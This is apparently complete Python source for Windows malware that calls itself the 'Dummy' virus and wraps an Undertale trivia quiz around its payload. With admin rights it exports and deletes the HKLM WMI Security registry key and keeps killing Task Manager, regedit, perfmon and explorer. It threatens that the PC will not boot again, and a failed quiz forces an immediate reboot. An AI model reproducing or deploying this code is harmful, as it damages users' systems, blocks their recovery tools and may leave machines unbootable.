import os
import subprocess
import sys

from win32com.shell import shell
import winreg as wg
from shutil import move
import psutil as pt
from threading import Thread
from time import sleep
from os import system
from win32api import MessageBox
from win32con import MB_ICONWARNING

# 是否为管理员运行
if shell.IsUserAnAdmin():
    no = 0
    exp = 0
    love = 0


    def jishu():
        sleep(600)
        x = system("shutdown -s -t 0")


    def getPidByName(Str):
        pids = pt.process_iter()
        pidList = []
        for pid in pids:
            if pid.name() == Str:
                pidList.append(pid.pid)
        return pidList


    def resource_path(relative_path):
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)


    try:
        virusbj = wg.OpenKey(wg.HKEY_LOCAL_MACHINE, r"SYSTEM\Dummy")
        sys.exit(0)
    except FileNotFoundError:
        pass

    killkey = wg.OpenKey(wg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\WMI")
    subprocess.run(r"reg export HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Security sec.reg", shell=True,
                   stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    move("sec.reg", resource_path(""))
    wg.DeleteKey(killkey, "Security")


    def killprocess():
        while True:
            if no == 1:
                break
            taskmgrtest = getPidByName("Taskmgr.exe")
            regtest = getPidByName("reg.exe")
            regedittest = getPidByName("regedit.exe")
            perfmontest = getPidByName("perfmon.exe")
            explorertest = getPidByName("explorer.exe")
            asktest = getPidByName("taskmgr.exe")
            if len(taskmgrtest) != 0:
                subprocess.run(r"taskkill /f /t /im Taskmgr.exe",
                               shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            elif len(regtest) != 0:
                subprocess.run(r"taskkill /f /t /im reg.exe",
                               shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            elif len(regedittest) != 0:
                subprocess.run(r"taskkill /f /t /im regedit.exe",
                               shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            elif len(perfmontest) != 0:
                subprocess.run(r"taskkill /f /t /im perfmon.exe",
                               shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            elif len(explorertest) != 0:
                subprocess.run(r"taskkill /f /im explorer.exe",
                               shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            elif len(asktest) != 0:
                subprocess.run(r"taskkill /f /t /im taskmgr.exe",
                               shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


    th1 = Thread(target=killprocess, args=())
    th1.start()

    # main
    print("          警告:如果现在重新启动计算机,计算机将无法启动!")
    print("\n\n\n\n\n")
    print("          我是一个病毒,我的名字叫Dummy")
    sleep(2)
    print("          我的朋友也是一个病毒")
    sleep(2)
    print("          当你运行它时,他本以为可以愉快的破坏你的电脑")
    sleep(2)
    print("          但是你都干了些什么!")
    sleep(2)
    x = system("cls")
    print("          警告:如果现在重新启动计算机,计算机将无法启动!")
    print("\n\n\n\n\n")
    print("          拒绝访问!")
    sleep(1.2)
    print("          拒绝访问!")
    sleep(1.2)
    print("          拒绝访问!")
    sleep(1.2)
    print("          把它气的离开了这台电脑!")
    sleep(1.2)
    str(x)
    x = system("cls")
    print("          警告:如果现在重新启动计算机,计算机将无法启动!")
    print("\n\n\n\n\n")
    print("          人类,我也要让你的系统脱离你的电脑!")
    sleep(1.2)
    print("          如果你回答对了我的问题,我会停止自己")
    sleep(1.2)
    print("          如果你没有,我会让你的系统脱离你的电脑")
    sleep(1.2)
    str(x)
    x = system("cls")
    print("          警告:如果现在重新启动计算机,计算机将无法启动!")
    sleep(1.2)
    print("\n\n\n\n\n")
    print("          快点吧,容不得犹豫,我已经打开了我的计时器")
    sleep(1.2)
    str(x)
    x = os.system("cls")
    print("------问题一------"
          "你现在在打屠杀吗?(y/n)")
    ask1 = input("input:")
    if ask1 == "y":
        exp = exp + 200
    else:
        pass
    x = system("cls")
    print("------问题二------"
          "Undertale的制作人是谁?(区分大小写)")
    ask2 = input("input:")
    if ask2 == "Toby Fox":
        pass
    else:
        exp = exp + 100
        love = love + 1
    x = system("cls")
    print("------问题三------"
          "逐梦家的所有怪物名字(格式:Xxxx-Xxxx,多个用逗号分割,顺序:托丽尔,艾斯戈尔,艾斯利尔)")
    ask3 = input("input:")
    if ask3 == "Toriel,Asgore-Dreemurr,Asriel-Dreemurr":
        pass
    else:
        exp = exp + 200
    x = system("cls")
    print("------问题4------"
          "DR是Toby Fox制作的吗?(y/n)")
    ask4 = input("input:")
    if ask4 == "y":
        pass
    else:
        exp = exp + 300
        love = love + 1
    x = system("cls")
    print("一设中,Gaster是sans的爸爸吗?"
          "A.是"
          "B.不是")
    ask5 = input("input:")
    if ask5 == "A":
        exp = exp + 200
    else:
        pass
    if exp > 500 or exp == 500:
        x = system("cls")
        print("\n\n\n\n\n          你的EXP大于或等于500,不及格!!!!! ")
        sleep(2)
        str(x)
        x = system("shutdown -r -t 0")
    else:
        no = 1
        x = system("cls")
        subprocess.run(r"reg import %s" % resource_path("") + r"\sec.reg",
                       shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        del jishu
        del killprocess
        str(x)
        x = os.system("cls")
        key2 = wg.OpenKey(wg.HKEY_LOCAL_MACHINE, "SYSTEM")
        wg.CreateKey(key2, "Dummy")
        key2 = wg.OpenKey(wg.HKEY_LOCAL_MACHINE, r"SYSTEM\Dummy")
        subprocess.run(r"REG ADD HKEY_LOCAL_MACHINE\SYSTEM\Dummy /v Dummy /t REG_SZ /f /d DUMMYTRUE",
                       shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("\n\n\n\n\n          好吧,你的exp小于500,通过了,请手动关闭")
        system("explorer")
        sleep(2)
        sys.exit(0)
else:
    MessageBox(0, "请以管理员身份运行!", "提示", MB_ICONWARNING)
